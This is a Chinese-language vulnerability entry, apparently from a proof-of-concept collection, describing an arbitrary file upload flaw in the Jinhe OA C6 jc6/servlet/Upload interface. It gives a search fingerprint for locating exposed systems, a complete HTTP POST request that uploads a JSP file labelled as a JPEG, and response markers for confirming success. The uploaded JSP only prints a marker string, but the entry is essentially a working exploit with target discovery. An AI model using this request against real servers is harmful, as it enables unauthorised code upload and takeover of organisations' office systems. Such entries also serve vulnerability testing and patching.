﻿# 金和OA jc6servletUpload接口存在任意文件上传漏洞

> 更新时间：2024-01-17

> 漏洞编号：

> 漏洞说明：金和OA协同办公管理系统C6软件（简称金和OA），本着简单、适用、高效的原则，贴合企事业单位的实际需求，实行通用化、标准化、智能化、人性化的产品设计，充分体现企事业单位规范管理、提高办公效率的核心思想，为用户提供一整套标准的办公自动化解决方案，以帮助企事业单位迅速建立便捷规范的办公环境。金和OA jc6/servlet/Upload接口存在任意文件上传漏洞。

> 漏洞特征：app="金和网络-金和OA"||body="/jc6/platform/sys/login"

> 验证脚本：HTTP

```
POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=ee055230808ca4602e92d0b7c4ecc63d

--ee055230808ca4602e92d0b7c4ecc63d
Content-Disposition: form-data; name="img"; filename="dudesuite.jsp"
Content-Type: image/jpeg

<% out.println("dudesuite"); %>
--ee055230808ca4602e92d0b7c4ecc63d--
```

> 响应代码特征：200

> 响应内容特征：.jsp

> 上传文件定位：


> 验证文件来源：金和OA jc6servletUpload接口存在任意文件上传漏洞.poc
